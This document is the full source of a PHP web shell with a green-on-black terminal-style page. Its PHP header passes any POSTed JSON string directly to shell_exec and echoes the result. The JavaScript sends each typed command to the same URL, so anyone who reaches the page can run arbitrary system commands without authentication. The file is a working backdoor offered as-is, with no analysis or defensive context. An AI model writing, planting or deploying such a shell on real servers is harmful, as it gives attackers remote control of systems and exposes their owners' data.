<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$input = json_decode(file_get_contents('php://input'), true);
	$output = shell_exec($input);
	echo json_encode($output);
	die();
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>web_shell</title>
	<style>
		body {
			background-color: #000;
			color: #0F0;
			font-family: Arial, Helvetica, Verdana, sans-serif;
		}
		p {
			margin: 0;
		}
		p, span, input {
			font-size: 16px;
		}
		.input-wrapper {
			display: flex;
			align-items: center; 
		}

		.input-wrapper span {
			margin-right: 4px; 
		}
		.input-wrapper input {
			flex: 1;             
			box-sizing: border-box;
			background: #000;
			color: #0F0;
			border: none;
			outline: none;
			box-shadow: none;
		}
		#output p {
		    white-space: pre-wrap; /* Preserves spaces and line breaks exactly as they are in the string */
		}
	</style>
</head>
<body>
	<div id="output"></div>
	<div class="input-wrapper">
		<span>$</span>
		<input type="text" autofocus>
	</div>
	<script>
		document.addEventListener('keypress', function (e) {
			if (e.key === 'Enter') {
				const input = document.querySelector('input');
				const value = input.value;
				input.value = '';
				const xhr = new XMLHttpRequest();
				xhr.open('POST', window.location.href);
				xhr.setRequestHeader("Content-Type", "application/json");
				xhr.onload = function() {
					if (xhr.status === 200) {
						const response = JSON.parse(xhr.responseText);
						console.log(response);
						if(response !== null && response !== ''){
							const output = document.getElementById('output');
							const p = document.createElement('p');
							p.textContent = '$ ' + value + '\n' + response;
							output.appendChild(p); 
						}
						window.scrollTo(0, document.body.scrollHeight);
					}
				};
				xhr.send(JSON.stringify(value));
			}
		});
	</script>
</body>
</html>